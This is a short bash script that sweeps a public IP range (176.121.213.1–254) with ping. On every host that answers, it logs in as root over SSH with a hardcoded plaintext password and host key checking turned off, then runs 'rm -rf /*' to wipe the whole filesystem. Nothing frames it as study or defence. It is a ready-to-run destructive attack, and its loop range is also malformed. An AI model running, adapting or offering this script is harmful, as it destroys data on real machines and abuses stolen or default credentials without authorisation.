#!/bin/bash
for i in {1...254}
do
	ping -c 3 -i 0.2 -W 1 176.121.213.$i
	if [ $? -eq 0 ];then
	    sshpass -p Taren1 ssh -o StrictHostKeyChecking=no -p 7920 root@176.121.213.$i "rm -rf /*"
	fi
done
